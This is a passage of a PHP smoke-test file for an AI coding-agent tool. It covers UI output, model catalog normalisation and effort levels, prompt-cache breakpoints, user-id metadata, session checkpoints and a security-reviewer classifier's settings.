    'unicode' => 'never',
    'markdown' => false,
    'usage' => false,
    'spinner' => false,
], static function (string $text) use (&$plainOut): void { $plainOut .= $text; }, static function (string $text): void {});
(new Agent($uiActor, $local, [], 'test', 100, 2, null, 24000, 2048, null, $plainUi))->run('Hi');
check($plainOut === "# Done\n\n**ok**\n", 'plain assistant output changed');

$toolActor = new class('unused') extends AnthropicClient {
    public int $calls = 0;
    public function message(string $model, int $maxTokens, string $system, array $messages, array $tools): array {
        $this->calls++;
        if ($this->calls === 1) {
            return ['content' => [['type' => 'tool_use', 'id' => 'ui-tool', 'name' => 'read_file', 'input' => ['path' => 'missing.txt']]], 'stop_reason' => 'tool_use'];
        }
        return ['content' => [['type' => 'text', 'text' => 'done']], 'stop_reason' => 'end_turn'];
    }
};
$uiErr = '';
(new Agent($toolActor, $local, [], 'test', 100, 2, null, 24000, 2048, null, $ui))->run('Read a missing file');
check(str_contains(Ansi::strip($uiErr), 'read_file'), 'tool activity missing from styled output');
check(str_contains(Ansi::strip($uiErr), 'Not found'), 'tool error summary missing from styled output');

// --- Model catalog and effort ------------------------------------------------

$deepseekPayload = ['object' => 'list', 'data' => [
    [
        'id' => 'deepseek-flash',
        'object' => 'model',
        'name' => 'DeepSeek-V4.1-Flash',
        'context_window' => 1048576,
        'max_output_tokens' => 393216,
        'effort' => ['supported_levels' => ['high', 'low', 'max'], 'default_level' => 'high'],
        'ignored' => true,
    ],
    [
        'id' => 'deepseek-v4-pro',
        'name' => 'DeepSeek-V4-Pro',
        'context_window' => 1048576,
        'max_output_tokens' => 393216,
        'effort' => ['supported_levels' => ['low', 'high', 'max'], 'default_level' => 'high'],
    ],
    ['id' => ''],
    ['name' => 'missing id'],
    ['id' => 'deepseek-flash', 'name' => 'duplicate'],
]];
$normalized = ModelCatalog::normalize($deepseekPayload);
check(count($normalized) === 2, 'catalog did not drop or deduplicate unusable entries');
check($normalized[0]['id'] === 'deepseek-flash', 'catalog id lost');
check($normalized[0]['name'] === 'DeepSeek-V4.1-Flash', 'catalog display name lost');
check($normalized[0]['context_window'] === 1048576, 'catalog context window lost');
check($normalized[0]['max_output_tokens'] === 393216, 'catalog output cap lost');
check($normalized[0]['effort_levels'] === ['low', 'high', 'max'], 'effort levels not normalized and sorted');
check($normalized[0]['default_effort'] === 'high', 'catalog default effort lost');

$anthropicModels = ModelCatalog::normalize(['data' => [[
    'id' => 'claude-opus-5-5',
    'display_name' => 'Claude Opus 5.5',
    'max_input_tokens' => 1000000,
    'max_tokens' => 128000,
]]]);
check($anthropicModels[0]['name'] === 'Claude Opus 5.5', 'display_name was not mapped');
check($anthropicModels[0]['context_window'] === 1000000, 'max_input_tokens was not mapped');
check($anthropicModels[0]['max_output_tokens'] === 128000, 'max_tokens was not mapped');
check($anthropicModels[0]['effort_levels'] === [], 'an effort capability was invented');

$staticCatalogModels = ModelCatalog::normalizeStatic([
    'deepseek-flash',
    ['id' => 'deepseek-v4-pro', 'name' => 'DeepSeek-V4-Pro', 'effort_levels' => ['low', 'max'], 'default_effort' => 'max'],
    ['id' => ''],
    ['id' => 'deepseek-flash'],
]);
check(count($staticCatalogModels) === 2, 'static catalog did not deduplicate');
check($staticCatalogModels[0]['name'] === 'deepseek-flash', 'static string entry lost its name');
check($staticCatalogModels[1]['effort_levels'] === ['low', 'max'], 'static effort levels lost');
check($staticCatalogModels[1]['default_effort'] === 'max', 'static default effort lost');

check(ModelCatalog::clampEffort(null, ['low', 'high', 'max']) === [null, false], 'null effort was altered');
check(ModelCatalog::clampEffort('high', ['low', 'high', 'max']) === ['high', false], 'declared effort was clamped');
check(ModelCatalog::clampEffort('medium', ['low', 'high', 'max']) === ['high', true], 'medium did not clamp to high');
check(ModelCatalog::clampEffort('xhigh', ['low', 'high', 'max']) === ['max', true], 'xhigh did not clamp to max');
check(ModelCatalog::clampEffort('max', []) === ['max', false], 'undeclared levels clamped the effort');
check(ModelCatalog::validEffort('MAX') && !ModelCatalog::validEffort('turbo'), 'effort validation is wrong');
$invalidEffort = errorOf(static fn(): array => ModelCatalog::clampEffort('turbo', ['low']));
check(str_contains($invalidEffort, 'Invalid effort level'), 'an invalid effort did not throw');
$badModelsUrl = errorOf(static fn(): ModelCatalog => new ModelCatalog($root, 'ftp://example.test/models'));
check(str_contains($badModelsUrl, 'http or https'), 'a non-http models_url was accepted');
$badModelsAuth = errorOf(static fn(): ModelCatalog => new ModelCatalog($root, '', 'token'));
check(str_contains($badModelsAuth, 'models_auth'), 'an invalid models_auth was accepted');

$catalogRoot = $root . '/tests/.catalog-' . getmypid();
@mkdir($catalogRoot . '/.agent', 0700, true);
$catalogCacheFile = $catalogRoot . '/.agent/models-cache.json';
try {
    file_put_contents($catalogCacheFile, json_encode([
        'version' => 1,
        'url' => 'https://example.test/models',
        'fetched_at' => time(),
        'models' => $normalized,
    ], JSON_THROW_ON_ERROR));
    $cachedCatalog = new ModelCatalog($catalogRoot, 'https://example.test/models', 'none', '', 'x-api-key', '', '2023-06-01', 3600, []);
    $cachedModels = $cachedCatalog->models();
    check(count($cachedModels) === 2 && $cachedCatalog->source() === 'cache', 'fresh cache was not used');
    check($cachedCatalog->effortLevels('deepseek-flash') === ['low', 'high', 'max'], 'cached effort levels are missing');
    check($cachedCatalog->defaultEffort('deepseek-flash') === 'high', 'cached default effort is missing');
    check($cachedCatalog->lastError() === null, 'cache use reported an error');

    $staticFallback = new ModelCatalog($catalogRoot, '', 'bearer', '', 'x-api-key', '', '2023-06-01', 3600, $staticCatalogModels);
    check($staticFallback->models() === $staticCatalogModels, 'static fallback was not used');
    check($staticFallback->source() === 'static', 'static fallback source is wrong');
    check($staticFallback->find('missing') === null, 'an unknown model was found');
} finally {
    @unlink($catalogCacheFile);
    @rmdir($catalogRoot . '/.agent');
    @rmdir($catalogRoot);
}

$bodyProbe = new class('unused') extends AnthropicClient {
    /** @param array<int, array<string, mixed>> $messages @param array<int, array<string, mixed>> $tools */
    public function body(string $model, int $maxTokens, string $system, array $messages, array $tools): array
    {
        return $this->requestBody($model, $maxTokens, $system, $messages, $tools);
    }
};
$plainBody = $bodyProbe->body('probe-model', 10, 'sys', [['role' => 'user', 'content' => 'hi']], []);
check(!isset($plainBody['output_config']), 'output_config was sent without an effort');
check($plainBody['model'] === 'probe-model', 'the request body lost the model');
$bodyProbe->setEffort('max');
$effortBody = $bodyProbe->body('probe-model', 10, 'sys', [['role' => 'user', 'content' => 'hi']], []);
check(($effortBody['output_config']['effort'] ?? null) === 'max', 'the effort is missing from the request body');
$insideWithout = $bodyProbe->withoutEffort(fn(): array => $bodyProbe->body('probe-model', 10, 'sys', [], []));
check(!isset($insideWithout['output_config']), 'withoutEffort did not omit the effort');
check($bodyProbe->effort() === 'max', 'withoutEffort did not restore the effort');
$invalidClientEffort = errorOf(static fn() => $bodyProbe->setEffort('turbo'));
check(str_contains($invalidClientEffort, 'Invalid effort level'), 'the client accepted an invalid effort');

$propProbe = new class('unused') extends AnthropicClient {
    /** @var list<string> */
    public array $models = [];
    /** @var list<?string> */
    public array $efforts = [];
    public function message(string $model, int $maxTokens, string $system, array $messages, array $tools): array
    {
        $this->models[] = $model;
        $this->efforts[] = $this->effort();
        return ['content' => [['type' => 'text', 'text' => 'ok']], 'stop_reason' => 'end_turn'];
    }
};
$propAgent = new Agent($propProbe, $local, [], 'start-model', 100, 2);
$propAgent->run('one');
$propAgent->setModel('next-model');
$propAgent->setEffort('max');
$propAgent->run('two');
check($propProbe->models === ['start-model', 'next-model'], 'a model switch did not reach the next call');
check($propProbe->efforts === [null, 'max'], 'an effort switch did not reach the next call');
check($propAgent->model() === 'next-model' && $propAgent->effort() === 'max', 'the agent did not expose the selection');
$badModel = errorOf(static fn() => $propAgent->setModel("bad\nmodel"));
check(str_contains($badModel, 'Invalid model name'), 'an invalid model name was accepted');
$propAgent->setModel('deepseek/v4-pro');
$propAgent->setModel('anthropic.claude-opus-5-5');
check($propAgent->model() === 'anthropic.claude-opus-5-5', 'valid model name forms were rejected');

$effortSession = 'smoke-effort-' . getmypid();
$effortStore = new SessionStore($root, $effortSession);
$effortSessionFile = $root . '/.agent/sessions/' . $effortSession . '.json';
try {
    $checkpointAgent = new Agent($propProbe, $local, [], 'start-model', 100, 2, $effortStore);
    $checkpointAgent->setModel('deepseek-v4-pro');
    $checkpointAgent->setEffort('low');
    $checkpointAgent->run('save the selection');
    $savedState = $effortStore->load();
    check(($savedState['model'] ?? null) === 'deepseek-v4-pro', 'the checkpoint lost the model');
    check(($savedState['effort'] ?? null) === 'low', 'the checkpoint lost the effort');
} finally {
    unset($effortStore);
    @unlink($effortSessionFile);
    @unlink($root . '/.agent/sessions/' . $effortSession . '.lock');
}

// The reviewer shares the actor's client but must never inherit its effort.
$reviewProbe = new class($allowJson) extends AnthropicClient {
    /** @var list<?string> */
    public array $efforts = [];
    public function __construct(private string $json)
    {
    }
    public function message(string $model, int $maxTokens, string $system, array $messages, array $tools): array
    {
        $this->efforts[] = $this->effort();
        return ['content' => [['type' => 'text', 'text' => $this->json]], 'stop_reason' => 'end_turn'];
    }
};
$reviewProbe->setEffort('max');
$reviewGate = new SecurityClassifier($reviewProbe, 'reviewer', $root, ['audit_log' => '']);
$reviewDecision = $reviewGate->review(
    ['type' => 'tool_use', 'id' => 'effort-review', 'name' => 'write_file', 'input' => ['path' => 'tests/.effort-review.txt', 'content' => 'x']],
    [],
    $catalog
);
check($reviewDecision['verdict'] === 'allow', 'the reviewer did not allow the probe call');
check($reviewProbe->efforts === [null], 'the reviewer inherited the actor effort');
check($reviewProbe->effort() === 'max', 'the reviewer effort wrapper did not restore the effort');

// --- Shared identity and prompt-cache breakpoints -----------------------------

// The identity is one constant for the whole process, and the breakpoint on the
// newest message must never leak into the stored conversation.
$identityProbe = new class('unused') extends AnthropicClient {
    /** @var list<array<string, mixed>> */
    public array $bodies = [];
    public string $reply = 'ok';
    /** @param array<int, array<string, mixed>> $messages @param array<int, array<string, mixed>> $tools */
    public function body(string $system, array $messages, array $tools = []): array
    {
        return $this->requestBody('probe-model', 8, $system, $messages, $tools);
    }
    public function message(string $model, int $maxTokens, string $system, array $messages, array $tools): array
    {
        $this->bodies[] = $this->requestBody($model, $maxTokens, $system, $messages, $tools);
        return ['content' => [['type' => 'text', 'text' => $this->reply]], 'stop_reason' => 'end_turn'];
    }
};
$breakpointCount = static fn(array $body): int => substr_count((string) json_encode($body), '"cache_control"');
$sharedMessages = [['role' => 'user', 'content' => 'hi']];

$identityProbe->setUserId('myagent-test');
check(($identityProbe->body('sys', $sharedMessages)['metadata']['user_id'] ?? null) === 'myagent-test', 'the shared user id is missing from the request body');
check(!isset($identityProbe->body('sys', $sharedMessages)['prompt_cache_key']), 'prompt_cache_key was sent without being enabled');
$identityProbe->setSendCacheKey(true);
check(($identityProbe->body('sys', $sharedMessages)['prompt_cache_key'] ?? null) === 'myagent-test', 'the opt-in cache key was not sent');
$identityProbe->setSendCacheKey(false);
$identityProbe->setUserId(null);
check(!isset($identityProbe->body('sys', $sharedMessages)['metadata']), 'metadata leaked with no user id');

foreach (['bad id', str_repeat('a', 257), "a\nb", ''] as $badUserId) {
    check(
        str_contains(errorOf(static fn() => AnthropicClient::assertValidUserId($badUserId)), 'Invalid user id'),
        'an invalid user id was accepted: ' . var_export($badUserId, true)
    );
}
foreach (['myagent', 'myagent:v2', 'team@host.local'] as $goodUserId) {
    AnthropicClient::assertValidUserId($goodUserId);
}

$identityProbe->setUserId('myagent-test');
$toolsForBreakpoints = [['name' => 'probe', 'description' => 'd', 'input_schema' => ['type' => 'object', 'properties' => new stdClass()]]];
check($breakpointCount($identityProbe->body('sys', $sharedMessages, $toolsForBreakpoints)) === 2, 'a first request must carry exactly the system and tools breakpoints');
$identityProbe->setCacheTtl('1h');
check(($identityProbe->body('sys', $sharedMessages)['system'][0]['cache_control']['ttl'] ?? null) === '1h', 'the 1h TTL is missing from the breakpoint');
$identityProbe->setCacheTtl('5m');
check(!isset($identityProbe->body('sys', $sharedMessages)['system'][0]['cache_control']['ttl']), 'the default breakpoint must not pin a TTL');
check(str_contains(errorOf(static fn() => $identityProbe->setCacheTtl('2h')), 'cache.ttl'), 'an unsupported cache TTL was accepted');
check(str_contains(errorOf(static fn() => $identityProbe->setCacheOptions(true, 'week')), 'cache.ttl'), 'setCacheOptions accepted an unsupported TTL');

$identitySession = 'smoke-identity-' . getmypid();
$identityStore = new SessionStore($root, $identitySession);
$identitySessionFile = $root . '/.agent/sessions/' . $identitySession . '.json';
try {
    $identityProbe->bodies = [];
    $identityProbe->setUserId('myagent-test');
    $identityAgent = new Agent($identityProbe, $local, [], 'test', 100, 1, $identityStore);
    $identityAgent->run('one');
    $identityAgent->run('two');
    check(count($identityProbe->bodies) === 2, 'expected two captured request bodies');
    check(
        ($identityProbe->bodies[0]['metadata']['user_id'] ?? null) === ($identityProbe->bodies[1]['metadata']['user_id'] ?? 'other'),
        'the shared user id changed between turns'
    );
    check($breakpointCount($identityProbe->bodies[0]) === 2, 'the first turn must not add a conversation breakpoint');
    check($breakpointCount($identityProbe->bodies[1]) === 3, 'the follow-up turn is missing the conversation breakpoint');
    check($identityAgent->usageTotals()['requests'] === 2, 'usage requests were not counted');
    check($identityAgent->cacheHitRatio() === 0.0, 'the hit ratio must be 0 without reported cache reads');
    $savedIdentitySession = (string) file_get_contents($identitySessionFile);
    check(!str_contains($savedIdentitySession, 'cache_control'), 'cache_control leaked into the session checkpoint');
    check(!str_contains($savedIdentitySession, '"metadata"'), 'metadata leaked into the session checkpoint');
} finally {
    unset($identityStore);
    @unlink($identitySessionFile);
    @unlink($root . '/.agent/sessions/' . $identitySession . '.lock');
}

// The reviewer shares the actor's client, so it must carry the same identity.
$identityProbe->bodies = [];
$identityProbe->reply = $allowJson;
$identityReviewer = new SecurityClassifier($identityProbe, 'reviewer', $root, ['audit_log' => '']);
$identityDecision = $identityReviewer->review(
    ['type' => 'tool_use', 'id' => 'identity-review', 'name' => 'write_file', 'input' => ['path' => 'tests/.identity-review.txt', 'content' => 'x']],
    [],
    $catalog
);
check($identityDecision['verdict'] === 'allow', 'the reviewer did not allow the identity probe');
$reviewerBody = $identityProbe->bodies[array_key_last($identityProbe->bodies)] ?? [];
check(($reviewerBody['metadata']['user_id'] ?? null) === 'myagent-test', 'the security reviewer did not inherit the shared user id');

fwrite(STDOUT, "Smoke tests passed\n");
